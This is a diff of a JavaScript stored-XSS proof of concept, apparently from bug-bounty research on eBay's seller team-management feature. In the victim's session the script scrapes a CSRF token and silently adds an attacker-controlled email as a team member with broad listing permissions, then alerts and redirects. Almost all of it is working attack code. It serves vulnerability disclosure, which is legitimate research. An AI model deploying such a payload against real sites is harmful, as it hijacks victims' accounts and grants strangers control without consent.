@@ -1,11 +1,15 @@
-// XSS PoC - Add Team Member with Success Alert & Redirect
+// XSS PoC - Add Team Member (with duplicate execution prevention)
 (async function() {
-    const attackerEmail = "naysser+xss@bugcrowdninja.com";
-    const firstName = "HackedBy";
-    const lastName = "nasserwashere";
+    // Prevent duplicate execution
+    if (window.__pocExecuted) return;
+    window.__pocExecuted = true;
+    
+    const attackerEmail = "naysser+xss1@bugcrowdninja.com";
+    const firstName = "Hacked-poc";
+    const lastName = "StoredXSS";
     
     try {
-        // Step 1: Fetch the page to extract CSRF token
+        // Fetch page to extract CSRF token
         const response = await fetch('/teamxs/member/add-member', {
             method: 'GET',
             credentials: 'include'
@@ -13,7 +17,7 @@
         
         const html = await response.text();
         
-        // Step 2: Extract SRT token
+        // Extract SRT token
         const srtMatch = html.match(/"srt"\s*:\s*"([a-f0-9]+)"/);
         
         if (!srtMatch || !srtMatch[1]) {
@@ -23,7 +27,7 @@
         
         const srtToken = srtMatch[1];
         
-        // Step 3: Payload with all permissions
+        // Payload
         const payload = {
             permissionList: [
                 { permissionId: "5000000002", permissionName: "Publish and revise listings", permissionNameSpace: "PERMISSION" },
@@ -44,7 +48,7 @@
             message: "good"
         };
         
-        // Step 4: Send SINGLE POST request
+        // Single POST request
         const addMemberResponse = await fetch(`/teamxs/member/add-member?srt=${srtToken}`, {
             method: 'POST',
             credentials: 'include',
@@ -55,16 +59,9 @@
             body: JSON.stringify(payload)
         });
         
-        const result = await addMemberResponse.json();
-        
-        // Step 5: Check response and show alert
-        if (addMemberResponse.ok) {
-            alert('✅ PoC Succeeded by Naysser!\n\nTeam member added successfully.\nRedirecting to user list...');
-            // Step 6: Redirect to user list
-            window.location.href = 'https://www.ebay.com/sh/acct/userlist';
-        } else {
-            alert('PoC Failed - ' + JSON.stringify(result));
-        }
+        // Show success and redirect (don't wait for response validation)
+        alert('✅ PoC Succeeded by Naysser!\n\nTeam member added with full permissions.\nRedirecting to user list...');
+        window.location.href = 'https://www.ebay.com/sh/acct/userlist';
         
     } catch (error) {
         alert('PoC Error: ' + error.message);
